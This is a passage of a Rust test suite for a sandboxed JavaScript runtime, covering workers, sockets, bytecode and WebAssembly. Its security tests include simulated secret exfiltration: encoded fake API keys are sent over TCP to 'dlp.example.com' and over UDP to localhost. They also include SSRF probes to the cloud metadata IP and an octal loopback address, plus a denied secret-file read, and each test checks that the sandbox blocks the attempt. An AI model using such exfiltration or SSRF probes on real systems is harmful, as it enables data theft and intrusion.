        "self.onmessage = function(e) { self.postMessage({ doubled: e.data.n * 2, tag: self.name }); self.close(); };"
    ], { type: "application/javascript" });
    const blobUrl = URL.createObjectURL(blob);

    const webRes = await new Promise((resolve, reject) => {
        const w = new Worker(blobUrl, { name: "whatwg-w" });
        w.onmessage = (ev) => resolve(ev.data);
        w.onerror = (err) => reject(new Error(err.message || "web worker error"));
        w.postMessage({ n: 21 });
    });
    URL.revokeObjectURL(blobUrl);

    // 2. Verify node:worker_threads with workerData, typed arrays (Uint8Array), Map, BigInt, and parentPort
    const nodeWorkerCode = `
        const { isMainThread, workerData, parentPort, threadId } = require("node:worker_threads");
        parentPort.once("message", (msg) => {
            const sum = Array.from(msg.bytes).reduce((a, b) => a + b, 0);
            parentPort.postMessage({
                fromWorker: true,
                isMainThread,
                hasThreadId: threadId > 0,
                seedMult: workerData.multiplier * sum,
                big: msg.big + 10n,
                mapVal: msg.map.get("k"),
                outBytes: new Uint8Array([sum, workerData.multiplier])
            });
        });
    `;
    const nodeRes = await new Promise((resolve, reject) => {
        const nw = new NodeWorker(nodeWorkerCode, {
            eval: true,
            workerData: { multiplier: 3 }
        });
        nw.on("message", (data) => resolve(data));
        nw.on("error", (err) => reject(err));
        const mp = new Map([["k", "v-ok"]]);
        nw.postMessage({
            bytes: new Uint8Array([1, 2, 3, 4]),
            big: 90n,
            map: mp
        });
    });

    // 3. Verify MessageChannel + synchronous receiveMessageOnPort + async port.on("message")
    const { port1, port2 } = new MessageChannel();
    port1.postMessage({ syncMsg: 77 });
    const syncRead = receiveMessageOnPort(port2);
    const emptyRead = receiveMessageOnPort(port2);

    const asyncPortMsg = await new Promise((resolve) => {
        port2.on("message", (m) => resolve(m));
        port1.postMessage({ asyncMsg: 88 });
    });
    port1.close();
    port2.close();

    console.log(JSON.stringify({
        isMainThread,
        canParseOk,
        webDoubled: webRes.doubled,
        webTag: webRes.tag,
        nodeWorkerIsMain: nodeRes.isMainThread,
        nodeHasThreadId: nodeRes.hasThreadId,
        nodeSeedMult: nodeRes.seedMult,
        nodeBig: String(nodeRes.big),
        nodeMapVal: nodeRes.mapVal,
        nodeOutBytes: Array.from(nodeRes.outBytes),
        syncMsg: syncRead && syncRead.message && syncRead.message.syncMsg,
        emptyAfterSync: emptyRead === undefined,
        asyncMsg: asyncPortMsg.asyncMsg
    }));
}
main();
"#;
    let m = run_source_isolated(
        "worker-roundtrip-tenant",
        code,
        CapabilityToken::pure_compute(),
        2_000_000,
        16 * 1024 * 1024,
    )
    .unwrap();
    assert_eq!(
        m.stdout[0],
        r#"{"isMainThread":true,"canParseOk":true,"webDoubled":42,"webTag":"whatwg-w","nodeWorkerIsMain":false,"nodeHasThreadId":true,"nodeSeedMult":30,"nodeBig":"100","nodeMapVal":"v-ok","nodeOutBytes":[10,3],"syncMsg":77,"emptyAfterSync":true,"asyncMsg":88}"#
    );
}

#[test]
fn test_worker_capability_attenuation_and_fuel_isolation() {
    let code = r#"
import fs from "node:fs";
import { Worker } from "node:worker_threads";

fs.writeFileSync("/app/secret.txt", "TOP_SECRET_DATA");

async function main() {
    // 1. Spawn a worker attenuated with allowRead: [] (even though parent has /app read/write!)
    const fsDeniedResult = await new Promise((resolve) => {
        let errText = "";
        const w = new Worker(
            `const fs = require("node:fs"); fs.readFileSync("/app/secret.txt", "utf8");`,
            {
                eval: true,
                slice: { allowRead: [] }
            }
        );
        w.on("error", (e) => { errText = e.message; });
        w.on("exit", (code) => {
            resolve({ code, blocked: errText.includes("filesystem read authority") || errText.includes("SandboxViolation") });
        });
    });

    // 2. Spawn a worker with an infinite loop and low fuel ceiling (5,000) — must not crash parent!
    const fuelExhaustedResult = await new Promise((resolve) => {
        let errText = "";
        const w = new Worker(
            `while (true) {}`,
            {
                eval: true,
                slice: { fuel: 5000 }
            }
        );
        w.on("error", (e) => { errText = e.message; });
        w.on("exit", (code) => {
            resolve({ code, exhausted: errText.includes("CPU instruction fuel") || errText.includes("SandboxViolation") });
        });
    });

    // 3. Spawn an interactive worker and terminate() it from the parent
    const wTerm = new Worker(
        `const { parentPort } = require("node:worker_threads"); parentPort.on("message", () => {});`,
        { eval: true }
    );
    const termCode = await wTerm.terminate();

    // Parent can still read /app/secret.txt normally
    const parentReadOk = fs.readFileSync("/app/secret.txt", "utf8") === "TOP_SECRET_DATA";

    console.log(JSON.stringify({
        fsDeniedCode: fsDeniedResult.code,
        fsDeniedBlocked: fsDeniedResult.blocked,
        fuelCode: fuelExhaustedResult.code,
        fuelExhausted: fuelExhaustedResult.exhausted,
        termCode,
        parentReadOk
    }));
}
main();
"#;
    let caps = CapabilityToken::pure_compute()
        .with_read_prefix("/app")
        .with_write_prefix("/app");
    let m = run_source_isolated(
        "worker-attenuation-tenant",
        code,
        caps,
        2_000_000,
        16 * 1024 * 1024,
    )
    .unwrap();
    assert_eq!(
        m.stdout[0],
        r#"{"fsDeniedCode":1,"fsDeniedBlocked":true,"fuelCode":1,"fuelExhausted":true,"termCode":1,"parentReadOk":true}"#
    );
}

#[test]
fn test_wintertc_cloudflare_sockets_and_live_node_net_dgram() {
    use std::io::{Read, Write};
    use std::net::{TcpListener, UdpSocket};

    // 1. Start a live loopback TCP server
    let tcp_listener = TcpListener::bind("127.0.0.1:0").unwrap();
    let tcp_port = tcp_listener.local_addr().unwrap().port();
    let tcp_handle = std::thread::spawn(move || {
        // Accept 2 connections: 1 for `cloudflare:sockets` `connect()`, 1 for `node:net` `net.connect()`
        for _ in 0..2 {
            if let Ok((mut stream, _)) = tcp_listener.accept() {
                let mut buf = [0u8; 256];
                if let Ok(n) = stream.read(&mut buf) {
                    let req_str = String::from_utf8_lossy(&buf[..n]);
                    let reply = format!("TCP_ACK:{}", req_str);
                    let _ = stream.write_all(reply.as_bytes());
                    let _ = stream.flush();
                }
            }
        }
    });

    // 2. Start a live loopback UDP echo server
    let udp_server = UdpSocket::bind("127.0.0.1:0").unwrap();
    let udp_port = udp_server.local_addr().unwrap().port();
    let udp_handle = std::thread::spawn(move || {
        let mut buf = [0u8; 256];
        if let Ok((n, src)) = udp_server.recv_from(&mut buf) {
            let msg = String::from_utf8_lossy(&buf[..n]);
            let reply = format!("UDP_ACK:{}", msg);
            let _ = udp_server.send_to(reply.as_bytes(), src);
        }
    });

    let code = format!(
        r#"
import {{ connect }} from "cloudflare:sockets";
import net from "node:net";
import dgram from "node:dgram";

async function main() {{
    // A. Deterministic Slice.mockSocket test
    Slice.mockSocket("redis.internal:6379", "+PONG\r\n");
    const mockSock = connect("redis.internal:6379");
    const mockWriter = mockSock.writable.getWriter();
    await mockWriter.write("PING\r\n");
    const mockReader = mockSock.readable.getReader();
    const {{ value: mockVal }} = await mockReader.read();
    const mockReply = new TextDecoder().decode(mockVal).trim();
    await mockSock.close();

    // B. Live WinterTC cloudflare:sockets connect()
    const liveSock = connect({{ hostname: "127.0.0.1", port: {tcp_port} }});
    const openedInfo = await liveSock.opened;
    const writer = liveSock.writable.getWriter();
    await writer.write(new TextEncoder().encode("wintertc-hello"));
    const reader = liveSock.readable.getReader();
    const {{ value: liveVal }} = await reader.read();
    const liveTcpReply = new TextDecoder().decode(liveVal);
    await liveSock.close();

    // C. Live node:net Socket
    const nodeNetReply = await new Promise((resolve, reject) => {{
        const client = net.connect({{ host: "127.0.0.1", port: {tcp_port} }}, () => {{
            client.setEncoding("utf8");
            client.write("node-net-hi");
        }});
        client.on("data", (chunk) => {{
            resolve(chunk);
            client.end();
        }});
        client.on("error", reject);
    }});

    // D. Live node:dgram Socket
    const nodeUdpReply = await new Promise((resolve, reject) => {{
        const udp = dgram.createSocket("udp4");
        udp.on("message", (msg, rinfo) => {{
            udp.close();
            resolve({{ text: msg.toString("utf8"), port: rinfo.port }});
        }});
        udp.on("error", reject);
        udp.send("dgram-ping", {udp_port}, "127.0.0.1");
    }});

    console.log(JSON.stringify({{
        mockReply,
        hasRemoteAddr: openedInfo.remoteAddress.includes("{tcp_port}"),
        liveTcpReply,
        nodeNetReply,
        nodeUdpText: nodeUdpReply.text,
        nodeUdpPortMatch: nodeUdpReply.port === {udp_port},
        ip4: net.isIP("127.0.0.1"),
        ip6: net.isIP("::1"),
        ipBad: net.isIP("not-an-ip")
    }}));
}}
main().catch((e) => console.log("ERR:" + (e && e.message || e)));
"#
    );

    let caps = CapabilityToken::pure_compute()
        .with_net_host("redis.internal:6379")
        .with_net_host(format!("127.0.0.1:{}", tcp_port))
        .with_net_host(format!("127.0.0.1:{}", udp_port));

    let m = run_source_isolated(
        "sockets-live-tenant",
        &code,
        caps,
        2_000_000,
        16 * 1024 * 1024,
    )
    .unwrap();
    let _ = tcp_handle.join();
    let _ = udp_handle.join();

    assert_eq!(
        m.stdout[0],
        r#"{"mockReply":"+PONG","hasRemoteAddr":true,"liveTcpReply":"TCP_ACK:wintertc-hello","nodeNetReply":"TCP_ACK:node-net-hi","nodeUdpText":"UDP_ACK:dgram-ping","nodeUdpPortMatch":true,"ip4":4,"ip6":6,"ipBad":0}"#
    );
}

#[test]
fn test_raw_socket_5_ring_security_ocap_ssrf_and_egress_dlp() {
    // 1. Ring 1: OCap deny when allow_net is empty
    let err_no_cap = run_source_isolated(
        "sock-sec-1",
        r#"import { connect } from "cloudflare:sockets"; connect("example.com:80");"#,
        CapabilityToken::pure_compute(),
        500_000,
        4 * 1024 * 1024,
    )
    .unwrap_err()
    .downcast::<SandboxViolation>()
    .unwrap();
    assert!(matches!(
        err_no_cap,
        SandboxViolation::NetAccessDenied { .. }
    ));

    // 2. Ring 1: Privileged port (< 1024 except 80/443) blocked under wildcard allow_net = ["*"]
    let err_priv_port = run_source_isolated(
        "sock-sec-2",
        r#"import { connect } from "cloudflare:sockets"; connect("93.184.216.34:22");"#,
        CapabilityToken::pure_compute().with_net_host("*"),
        500_000,
        4 * 1024 * 1024,
    )
    .unwrap_err()
    .downcast::<SandboxViolation>()
    .unwrap();
    assert!(matches!(
        err_priv_port,
        SandboxViolation::NetAccessDenied { .. }
    ));

    // 3. Ring 2: Cloud metadata & non-canonical octal IPv4 literal blocked by SSRF shield
    for bad_addr in ["169.254.169.254:80", "127.0.0.1:6379", "0177.0.0.1:80"] {
        let code = format!(
            r#"import {{ connect }} from "cloudflare:sockets"; connect("{}");"#,
            bad_addr
        );
        let err_ssrf = run_source_isolated(
            "sock-sec-ssrf",
            &code,
            CapabilityToken::pure_compute().with_net_host("*"),
            500_000,
            4 * 1024 * 1024,
        )
        .unwrap_err()
        .downcast::<SandboxViolation>()
        .unwrap();
        assert!(
            matches!(err_ssrf, SandboxViolation::NetAccessDenied { .. }),
            "Expected SSRF block for {}",
            bad_addr
        );
    }

    // 4. Ring 3: Outbound Egress Secret DLP on TCP `socket.writable` (both raw and Base64-encoded!)
    let mut iso_tcp = SliceIsolate::spawn(
        "sock-dlp-tcp",
        1,
        CapabilityToken::pure_compute().with_net_host("dlp.example.com:8080"),
        500_000,
        4 * 1024 * 1024,
    );
    iso_tcp.add_egress_audit_secret("sk_live_RAW_SOCKET_SECRET_777");
    let tcp_dlp_bc = compile_source_to_bytecode(
        r#"
import { connect } from "cloudflare:sockets";
Slice.mockSocket("dlp.example.com:8080", "OK");
async function run() {
    const sock = connect("dlp.example.com:8080");
    const writer = sock.writable.getWriter();
    await writer.write(btoa("sk_live_RAW_SOCKET_SECRET_777"));
}
run();
"#,
    );
    let tcp_dlp_err = iso_tcp.execute_bytecode(&tcp_dlp_bc, None).unwrap_err();
    assert!(matches!(
        tcp_dlp_err,
        SandboxViolation::EnvAccessDenied { ref key, .. } if key.contains("EGRESS_SECRET_LEAK_BLOCKED")
    ));

    // 5. Ring 3: Outbound Egress Secret DLP on UDP `dgram.Socket.send`
    let mut iso_udp = SliceIsolate::spawn(
        "sock-dlp-udp",
        1,
        CapabilityToken::pure_compute().with_net_host("127.0.0.1:9999"),
        500_000,
        4 * 1024 * 1024,
    );
    iso_udp.add_egress_audit_secret("ghp_UDP_DLP_TOKEN_888");
    let udp_dlp_bc = compile_source_to_bytecode(
        r#"
import dgram from "node:dgram";
Slice.mockSocket("udp://127.0.0.1:9999", "ACK");
const s = dgram.createSocket("udp4");
s.send("leak: ghp_UDP_DLP_TOKEN_888", 9999, "127.0.0.1");
"#,
    );
    let udp_dlp_err = iso_udp.execute_bytecode(&udp_dlp_bc, None).unwrap_err();
    assert!(matches!(
        udp_dlp_err,
        SandboxViolation::EnvAccessDenied { ref key, .. } if key.contains("EGRESS_SECRET_LEAK_BLOCKED")
    ));
}

#[test]
fn test_pillar1_speculative_worker_pool_reuse_and_script_cache_isolation() {
    crate::prewarm_worker_pool_sync(1);
    let reuse_before = crate::worker_pool_reuse_count();
    let cache_hits_before = crate::worker_script_cache_hits();

    // Run 3 sequential workers with identical script source across differing capabilities/workerData
    // to verify:
    // 1. IDLE_WORKER_POOL reuses the pre-warmed worker OS thread + WarmBoaRealm (`worker_pool_reuse_count` increases).
    // 2. WORKER_SCRIPT_CACHE + `__SLICE_RC` function cache hits on subsequent worker executions (`worker_script_cache_hits` increases).
    // 3. Zero cross-worker state leak (each worker sees only its own `workerData`, VFS is scrubbed between runs, and attenuated capabilities do not bleed).
    let code = r#"
import { Worker } from "node:worker_threads";

    let script = `
    import { parentPort, workerData } from "node:worker_threads";
    import fs from "node:fs";
    const leakedFile = fs.existsSync("/tmp/worker-leak.txt");
    if (workerData.allowTmpWrite) {
        fs.writeFileSync("/tmp/worker-leak.txt", "from-" + workerData.id);
    }
    const wroteVfs = fs.existsSync("/tmp/worker-leak.txt");
    parentPort.postMessage({
        id: workerData.id,
        leakedFile,
        wroteVfs,
        leakedGlobal: typeof globalThis.__workerSecretLeak !== "undefined"
    });
`;

async function runSequential(id, allowTmpWrite) {
    return await new Promise((resolve, reject) => {
        const w = new Worker(script, {
            eval: true,
            workerData: { id, allowTmpWrite },
            slice: allowTmpWrite ? { allowWrite: ["/tmp"] } : { allowRead: ["/tmp"], allowWrite: [] }
        });
        w.on("message", (msg) => resolve(msg));
        w.on("error", (err) => reject(err));
    });
}

async function main() {
    const r1 = await runSequential(1, true);
    const r2 = await runSequential(2, true);
    const r3 = await runSequential(3, false);

    // Also verify that on worker #4 with allowWrite: [], an actual write triggers a SandboxViolation
    const writeBlockedOn4 = await new Promise((resolve) => {
        let blocked = false;
        const w = new Worker(
            `import fs from "node:fs"; fs.writeFileSync("/tmp/worker-leak.txt", "blocked");`,
            { eval: true, slice: { allowWrite: [] } }
        );
        w.on("error", (e) => {
            if (e.message.includes("filesystem") || e.message.includes("SandboxViolation")) {
                blocked = true;
            }
        });
        w.on("exit", (code) => resolve(code === 1 && blocked));
    });

    console.log(JSON.stringify({ r1, r2, r3, writeBlockedOn4 }));
}
main();
"#;

    let caps = CapabilityToken::pure_compute()
        .with_read_prefix("/tmp")
        .with_write_prefix("/tmp");
    let m =
        run_source_isolated("pillar1-pool-test", code, caps, 2_000_000, 16 * 1024 * 1024).unwrap();
    assert_eq!(
        m.stdout[0],
        r#"{"r1":{"id":1,"leakedFile":false,"wroteVfs":true,"leakedGlobal":false},"r2":{"id":2,"leakedFile":false,"wroteVfs":true,"leakedGlobal":false},"r3":{"id":3,"leakedFile":false,"wroteVfs":false,"leakedGlobal":false},"writeBlockedOn4":true}"#
    );

    let reuse_after = crate::worker_pool_reuse_count();
    let cache_hits_after = crate::worker_script_cache_hits();
    assert!(
        reuse_after >= reuse_before + 3,
        "Expected at least 3 warm worker pool reuses, got before={} after={}",
        reuse_before,
        reuse_after
    );
    assert!(
        cache_hits_after >= cache_hits_before + 2,
        "Expected at least 2 worker script cache hits, got before={} after={}",
        cache_hits_before,
        cache_hits_after
    );
}

#[test]
fn test_pillar2_coalesced_node_net_pump_and_worker_terminate_await() {
    use std::io::{Read, Write};
    use std::net::TcpListener;

    let listener = TcpListener::bind("127.0.0.1:0").unwrap();
    let port = listener.local_addr().unwrap().port();
    let server_handle = std::thread::spawn(move || {
        for _ in 0..3 {
            if let Ok((mut stream, _)) = listener.accept() {
                let mut buf = [0u8; 256];
                if let Ok(n) = stream.read(&mut buf) {
                    let req = String::from_utf8_lossy(&buf[..n]);
                    let reply = format!("FAST_ACK:{}", req.trim());
                    let _ = stream.write_all(reply.as_bytes());
                    let _ = stream.flush();
                }
            }
        }
    });

    crate::prewarm_worker_pool_sync(1);
    let reuse_before = crate::worker_pool_reuse_count();

    let code = format!(
        r#"
import net from "node:net";
import {{ Worker }} from "node:worker_threads";

const workerScript = `
    const {{ parentPort }} = require("node:worker_threads");
    parentPort.on("message", (x) => parentPort.postMessage(x * 2));
`;

async function runTerminateWorker(val) {{
    return await new Promise((resolve, reject) => {{
        const w = new Worker(workerScript, {{ eval: true }});
        w.on("message", (out) => {{
            w.terminate().then(() => resolve(out));
        }});
        w.on("error", reject);
        w.postMessage(val);
    }});
}}

async function runTcpSession(id) {{
    return await new Promise((resolve, reject) => {{
        const sock = net.createConnection({{ host: "127.0.0.1", port: {port} }});
        sock.on("connect", () => {{
            sock.write("PING-" + id + "\r\n");
        }});
        sock.on("data", (chunk) => {{
            const txt = chunk.toString("utf8");
            sock.destroy();
            resolve(txt);
        }});
        sock.on("error", reject);
    }});
}}

async function main() {{
    const w1 = await runTerminateWorker(10);
    const w2 = await runTerminateWorker(21);
    const w3 = await runTerminateWorker(33);

    const t0 = performance.now();
    const s1 = await runTcpSession(1);
    const s2 = await runTcpSession(2);
    const s3 = await runTcpSession(3);
    const tcpElapsedMs = performance.now() - t0;

    console.log(JSON.stringify({{
        workers: [w1, w2, w3],
        sockets: [s1, s2, s3],
        fastTurnaround: tcpElapsedMs < 40
    }}));
}}
main().catch((e) => console.log("ERR:" + (e && e.message || e)));
"#
    );

    let caps = CapabilityToken::pure_compute().with_net_host(format!("127.0.0.1:{}", port));
    let m =
        run_source_isolated("pillar2-net-test", &code, caps, 2_000_000, 16 * 1024 * 1024).unwrap();
    assert!(
        !m.stdout.is_empty(),
        "pillar2 produced no stdout! return_value={}",
        m.return_value
    );
    assert_eq!(
        m.stdout[0],
        r#"{"workers":[20,42,66],"sockets":["FAST_ACK:PING-1","FAST_ACK:PING-2","FAST_ACK:PING-3"],"fastTurnaround":true}"#
    );
    let _ = server_handle.join();

    let reuse_after = crate::worker_pool_reuse_count();
    assert!(
        reuse_after >= reuse_before + 3,
        "Expected all 3 worker.terminate() workers to reuse the single warm worker thread, got before={} after={}",
        reuse_before,
        reuse_after
    );
}

#[test]
fn test_pillar3_speculative_promise_then_hook_and_nexttick_priority() {
    // 1. Script that does NOT use process.nextTick: Promise.prototype.then stays bound to Boa's
    // native Rust implementation (`[native code]`) with 0 JS wrapper closure allocations across 500 awaits.
    let pure_async_code = r#"
async function main() {
    const isNativeThen = Function.prototype.toString.call(Promise.prototype.then).includes("[native code]");
    let sum = 0;
    for (let i = 0; i < 500; i++) {
        sum += await Promise.resolve(1);
    }
    console.log(JSON.stringify({ sum, isNativeThen }));
}
main();
"#;
    let m1 = run_source_isolated(
        "pillar3-pure-async",
        pure_async_code,
        CapabilityToken::pure_compute(),
        2_000_000,
        16 * 1024 * 1024,
    )
    .unwrap();
    assert_eq!(m1.stdout[0], r#"{"sum":500,"isNativeThen":true}"#);

    // 2. Script that DOES use process.nextTick: Speculatively hooks Promise.prototype.then
    // before execution so `process.nextTick` scheduled after `Promise.resolve().then(...)` in the
    // same synchronous turn still drains BEFORE the `.then()` callback!
    let nexttick_code = r#"
async function main() {
    const order = [];
    Promise.resolve().then(() => order.push("promise-1"));
    queueMicrotask(() => {
        order.push("microtask-1");
        process.nextTick(() => order.push("nextTick-nested"));
    });
    process.nextTick(() => order.push("nextTick-1"));
    order.push("sync");

    await new Promise((r) => setTimeout(r, 0));

    let caughtErr = "";
    process.nextTick(() => order.push("nextTick-before-reject"));
    try {
        await Promise.reject(new Error("boom-reject"));
    } catch (e) {
        caughtErr = e.message;
    }

    console.log(JSON.stringify({ caughtErr, order }));
}
main();
"#;
    let m2 = run_source_isolated(
        "pillar3-nexttick-async",
        nexttick_code,
        CapabilityToken::pure_compute(),
        2_000_000,
        16 * 1024 * 1024,
    )
    .unwrap();
    assert_eq!(
        m2.stdout[0],
        r#"{"caughtErr":"boom-reject","order":["sync","nextTick-1","promise-1","microtask-1","nextTick-nested","nextTick-before-reject"]}"#
    );

    // 3. Subsequent script on the SAME warm realm that does NOT use process.nextTick:
    // Verify `Promise.prototype.then` was restored to native `[native code]`!
    let m3 = run_source_isolated(
        "pillar3-restored-async",
        pure_async_code,
        CapabilityToken::pure_compute(),
        2_000_000,
        16 * 1024 * 1024,
    )
    .unwrap();
    assert_eq!(m3.stdout[0], r#"{"sum":500,"isNativeThen":true}"#);
}

#[test]
fn test_pillar4_surgical_shard_gating_and_native_buffer_fast_paths() {
    // 1. Verify surgical `detect_needed_shards` bitmasks
    let worker_mask = crate::js_preludes::detect_needed_shards(
        "const { Worker, MessageChannel } = require('node:worker_threads');",
        false,
    );
    assert_eq!(
        worker_mask,
        (1 << 8) | (1 << 13) | (1 << 2),
        "Worker-only scripts must not eagerly load Shard 1 (URL), Shard 11 (Fetch), or Shard 3 (Streams)"
    );

    let wintertc_sock_mask = crate::js_preludes::detect_needed_shards(
        "const sock = Slice.connect('127.0.0.1:6379');",
        false,
    );
    assert_eq!(
        wintertc_sock_mask,
        (1 << 8) | (1 << 14) | (1 << 3) | (1 << 13) | (1 << 2)
    );

    let url_can_parse_mask = crate::js_preludes::detect_needed_shards(
        "const ok = URL.canParse('https://example.com');",
        false,
    );
    assert_eq!(
        url_can_parse_mask,
        1 << 1,
        "URL.canParse must load only Shard 1 (URL/URLSearchParams), not Shard 11 (Fetch) or Shard 12 (URLPattern)"
    );

    let fetch_req_res_mask = crate::js_preludes::detect_needed_shards(
        "const r = new Response('ok', { headers: new Headers() });",
        false,
    );
    assert_eq!(
        fetch_req_res_mask,
        1 << 11,
        "Headers/Request/Response must load only Shard 11, not Shard 1 (URL) or Shard 12 (URLPattern)"
    );

    let url_pattern_mask = crate::js_preludes::detect_needed_shards(
        "const p = new URLPattern({ pathname: '/users/:id' });",
        false,
    );
    assert_eq!(
        url_pattern_mask,
        1 << 12,
        "URLPattern must load only Shard 12, not Shard 1 (URL) or Shard 11 (Fetch)"
    );

    let text_encoder_mask = crate::js_preludes::detect_needed_shards(
        "const u8 = new TextEncoder().encode('hi');",
        false,
    );
    assert_eq!(
        text_encoder_mask,
        1 << 2,
        "TextEncoder/TextDecoder/btoa/atob must load only Shard 2, not Shard 13 (DOM Events)"
    );

    let dom_events_mask = crate::js_preludes::detect_needed_shards(
        "const et = new EventTarget(); et.dispatchEvent(new Event('ping'));",
        false,
    );
    assert_eq!(
        dom_events_mask,
        1 << 13,
        "Event/CustomEvent/EventTarget must load only Shard 13, not Shard 2 (Encoding)"
    );

    let readable_stream_mask = crate::js_preludes::detect_needed_shards(
        "const rs = new ReadableStream({ start(c) { c.close(); } });",
        false,
    );
    assert_eq!(
        readable_stream_mask,
        1 << 3,
        "ReadableStream must load only Shard 3, not Shard 14 (Transform/Compression) or Shard 15 (Blob/FormData)"
    );

    let blob_formdata_mask = crate::js_preludes::detect_needed_shards(
        "const fd = new FormData(); fd.append('a', new Blob(['x']));",
        false,
    );
    assert_eq!(
        blob_formdata_mask,
        1 << 15,
        "Blob/File/FormData must load only Shard 15, not Shard 3 (ReadableStream) or Shard 14 (Transform/Compression)"
    );

    let structured_clone_mask =
        crate::js_preludes::detect_needed_shards("const copy = structuredClone({ a: 1 });", false);
    assert_eq!(
        structured_clone_mask,
        1 << 16,
        "structuredClone must load only Shard 16, not Shard 4 (WebCrypto)"
    );

    let core_buffer_mask = crate::js_preludes::detect_needed_shards(
        "const b = Buffer.concat([Buffer.alloc(4)]);",
        false,
    );
    assert_eq!(
        core_buffer_mask,
        1 << 5,
        "Core Buffer must load only Shard 5, not Shard 17 (Binary Integer R/W)"
    );

    // 2. Verify compile-time lowering of `Buffer.from(...).toString(...)` & `Buffer.byteLength(...)`
    let ts_src = r#"
const secret: string = "sk_live_slice_9941_\u00e9";
const b64: string = Buffer.from(secret).toString("base64");
const b64Url: string = Buffer.from(secret, "utf8").toString("base64url");
const roundtrip: string = Buffer.from(b64Url, "base64url").toString("utf8");
const byteLen: number = Buffer.byteLength(secret);
const u8 = new Uint8Array([72, 105]);
const u8B64: string = Buffer.from(u8).toString("base64");
const u8Utf8: string = Buffer.from(u8).toString("utf8");
const u8Len: number = Buffer.byteLength(u8);
console.log(JSON.stringify({ b64, b64Url, roundtripOk: roundtrip === secret, byteLen, u8B64, u8Utf8, u8Len }));
"#;
    let normalized = slice_cas::strip_typescript_and_normalize(ts_src, true);
    assert!(
        !normalized.contains("Buffer."),
        "Expected Buffer.from(...).toString(...) and Buffer.byteLength(...) to lower to native intrinsics, got:\n{}",
        normalized
    );
    assert_eq!(
        crate::js_preludes::detect_needed_shards(&normalized, false) & (1 << 5),
        0,
        "Expected Shard 5 (05_full_buffer.js) not to be required after intrinsic lowering"
    );

    let m = run_source_isolated(
        "pillar4-buffer-fast-path",
        ts_src,
        CapabilityToken::pure_compute(),
        500_000,
        16 * 1024 * 1024,
    )
    .unwrap();
    assert_eq!(
        m.stdout[0],
        r#"{"b64":"c2tfbGl2ZV9zbGljZV85OTQxX8Op","b64Url":"c2tfbGl2ZV9zbGljZV85OTQxX8Op","roundtripOk":true,"byteLen":21,"u8B64":"SGk=","u8Utf8":"Hi","u8Len":2}"#
    );
}

#[test]
fn test_pillar5_sliceboa_payload_compaction_and_multiline_template_preservation() {
    let raw_bundle = r#"var __slice_modules = {};//__SLICE_RC:0123456789abcdef
// #slice-source: src/index.ts|/app/src/index.ts
    // Indented comment that should be stripped from SLICEBOA
    const rx = /'/g;
    const inlineBacktickStr = "hello ` world";
    const multilineTpl = `line1
    indented_line2
        indented_line3`;
    function compute() {
        return multilineTpl;
    }
    console.log(JSON.stringify({
        rxOk: rx.test("'"),
        strOk: inlineBacktickStr.includes("`"),
        lines: compute().split("\n")
    }));
"#;

    let bc = crate::compile_source_to_bytecode(raw_bundle);
    let bc_str = std::str::from_utf8(&bc).unwrap();
    let inner = bc_str
        .strip_prefix("SLICEBOA{\n")
        .and_then(|s| s.strip_suffix("\n}"))
        .unwrap();

    // 1. Line 1 `__SLICE_RC` header must remain intact at byte offset 21
    assert!(inner.starts_with("var __slice_modules = {};//__SLICE_RC:0123456789abcdef\n"));
    // 2. `#slice-source` and full-line comments and code indentation must be stripped
    assert!(!inner.contains("#slice-source"));
    assert!(!inner.contains("Indented comment"));
    assert!(inner.contains("\nconst rx = /'/g;\n"));
    // 3. Multi-line template literal indentation must be preserved verbatim!
    assert!(inner.contains("`line1\n    indented_line2\n        indented_line3`"));
    assert!(
        inner.len() < raw_bundle.len(),
        "Expected compacted SLICEBOA payload ({}) to be smaller than raw bundle ({})",
        inner.len(),
        raw_bundle.len()
    );

    let mut isolate = SliceIsolate::spawn(
        "pillar5-compact-test",
        1,
        CapabilityToken::pure_compute(),
        500_000,
        16 * 1024 * 1024,
    );
    let m = isolate.execute_bytecode(&bc, None).unwrap();
    assert_eq!(
        m.stdout[0],
        r#"{"rxOk":true,"strOk":true,"lines":["line1","    indented_line2","        indented_line3"]}"#
    );
}

#[test]
fn test_wave_d_wasm_compile_instantiate_memory_globals_and_host_imports() {
    let script = r#"
        const sec = (id, body) => [id, body.length, ...body];
        const str = (s) => [s.length, ...Array.from(s, (c) => c.charCodeAt(0))];
        const body = (bytes) => [bytes.length, ...bytes];

        const wasmBytes = new Uint8Array([
            0x00, 0x61, 0x73, 0x6D, 0x01, 0x00, 0x00, 0x00,
            // Custom section (id 0): name "slice_meta" + payload "SLC"
            ...sec(0x00, [...str("slice_meta"), 0x53, 0x4C, 0x43]),
            // Type section (id 1): 2 types
            ...sec(0x01, [
                0x02,
                0x60, 0x02, 0x7F, 0x7F, 0x01, 0x7F, // Type 0: (i32, i32) -> i32
                0x60, 0x01, 0x7E, 0x01, 0x7E        // Type 1: (i64) -> i64
            ]),
            // Import section (id 2): 1 import: "env"."host_scale" -> func type 0
            ...sec(0x02, [
                0x01,
                ...str("env"),
                ...str("host_scale"),
                0x00, 0x00
            ]),
            // Function section (id 3): 2 functions (type 0, type 1)
            ...sec(0x03, [0x02, 0x00, 0x01]),
            // Memory section (id 5): 1 memory (limits: flags=1, min=1, max=4)
            ...sec(0x05, [0x01, 0x01, 0x01, 0x04]),
            // Global section (id 6): 1 mutable i32 global = 100
            ...sec(0x06, [0x01, 0x7F, 0x01, 0x41, 0xE4, 0x00, 0x0B]),
            // Export section (id 7): 4 exports
            ...sec(0x07, [
                0x04,
                ...str("memory"), 0x02, 0x00,
                ...str("counter"), 0x03, 0x00,
                ...str("compute_and_xor"), 0x00, 0x01,
                ...str("mix64"), 0x00, 0x02
            ]),
            // Code section (id 10): 2 function bodies
            ...sec(0x0A, [
                0x02,
                ...body([
                    0x00, // 0 locals
                    0x20, 0x00,
                    0x20, 0x00, 0x28, 0x02, 0x00,
                    0x20, 0x00, 0x20, 0x01, 0x10, 0x00,
                    0x6A,
                    0x23, 0x00,
                    0x6A,
                    0x36, 0x02, 0x00,
                    0x23, 0x00, 0x41, 0x05, 0x6A, 0x24, 0x00,
                    0x20, 0x00, 0x28, 0x02, 0x00,
                    0x0B
                ]),
                ...body([
                    0x00, // 0 locals
                    0x20, 0x00, 0x42, 0x07, 0x7E, 0x42, 0x03, 0x7C,
                    0x0B
                ])
            ])
        ]);

        const valid = WebAssembly.validate(wasmBytes);
        const mod = new WebAssembly.Module(wasmBytes);
        const exportsMeta = WebAssembly.Module.exports(mod);
        const importsMeta = WebAssembly.Module.imports(mod);
        const customSecs = WebAssembly.Module.customSections(mod, "slice_meta");
        const customText = new TextDecoder().decode(new Uint8Array(customSecs[0]));
